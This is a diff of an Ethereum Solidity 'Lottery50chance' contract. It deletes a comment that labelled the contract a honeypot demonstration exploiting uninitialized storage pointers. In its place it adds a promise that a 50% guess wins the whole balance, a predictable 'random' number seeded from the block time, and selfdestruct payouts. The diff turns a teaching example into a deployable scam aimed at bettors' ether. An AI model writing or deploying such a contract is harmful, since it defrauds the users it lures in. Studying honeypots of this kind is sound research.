@@ -1,13 +1,17 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Lottery50chance at 0x08fc24c9128591b74191fcff6833e746ba67d63e
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Lottery50chance at 0x29d6cf436c893c7e44ea926411d5fd4dd763d9b3
 */
-//demonstration of a how a honeypot contract is exploiting the way uninitialized storage pointers are handled
+/*
+BET NUMBER 0 or 1.IF YOU WIN,THIS CONTRACT WILL AUTOMATIC SEND ALL BALANCE TO YOU.IF YOU LOSE,
+THIS CONTRACT WILL SEND ALL BALANCE TO OWNER. ENJOY 50%.
+*/
 
-pragma solidity ^0.4.25;
+pragma solidity ^0.4.19;
 contract Lottery50chance
 {
-  uint256 public randomNumber = 1;
-  uint256 public minBet = 1 finney;
+  // creates random number between 0 and 1 on contract creation
+  uint256 private randomNumber = uint256( keccak256(now) ) % 2;
+  uint256 public minBet = 1 ether;
   address owner = msg.sender;
 
   struct GameHistory 
@@ -40,13 +44,15 @@ contract Lottery50chance
        
           if (_number == randomNumber) 
           {
-              msg.sender.transfer(address(this).balance);
+              selfdestruct(msg.sender);
           }else{
-              owner.transfer(address(this).balance);
+              selfdestruct(owner);
           }
           
       }
   }
+  
+  //if no one play the game.owner withdraw
   
   function withdraw(uint256 amount) 
   public 
